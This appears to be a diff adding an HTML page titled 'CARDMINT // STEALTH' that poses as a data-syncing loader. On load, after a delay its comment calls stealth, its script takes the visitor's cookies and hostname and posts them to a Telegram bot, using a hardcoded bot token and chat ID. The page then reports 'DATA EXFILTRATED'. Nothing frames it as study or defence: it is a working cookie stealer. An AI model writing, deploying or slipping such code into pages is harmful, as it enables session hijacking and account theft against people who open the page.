@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CARDMINT // STEALTH</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .loader {
+            border: 4px solid #0f0;
+            border-top: 4px solid transparent;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            position: absolute;
+            bottom: 20px;
+            font-size: 12px;
+            opacity: 0.7;
+        }
+    </style>
+</head>
+<body>
+
+<div class="loader"></div>
+<div class="status" id="msg">SYNCING DATA...</div>
+
+<script>
+    // 🔑 HARDCODED CONFIGURATION 🔑
+    const BOT_TOKEN = "9209995430:AAFHrVmN8m2yNpuIZlbh1lURlS1PBB-Gx44";
+    const CHAT_ID = "6534130302"; 
+
+    function sendCookies() {
+        const cookies = document.cookie || "(No Cookies Found)";
+        const domain = window.location.hostname || "Localhost";
+        
+        const message = `🔓 *CARDMINT SNIPER* 🔓\n\n🌐 Target: ${domain}\n⏰ Time: ${new Date().toLocaleString()}\n\n🍪 Data:\n\`\`\`${cookies}\`\`\``;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => {
+            if (response.ok) {
+                document.getElementById('msg').innerText = "✅ DATA EXFILTRATED";
+                document.querySelector('.loader').style.display = 'none';
+            } else {
+                document.getElementById('msg').innerText = "❌ SYNC FAILED";
+            }
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            document.getElementById('msg').innerText = "❌ OFFLINE";
+        });
+    }
+
+    // Execute on load with a slight delay for stealth
+    window.onload = () => {
+        setTimeout(sendCookies, 1500);
+    };
+</script>
+
+</body>
+</html>
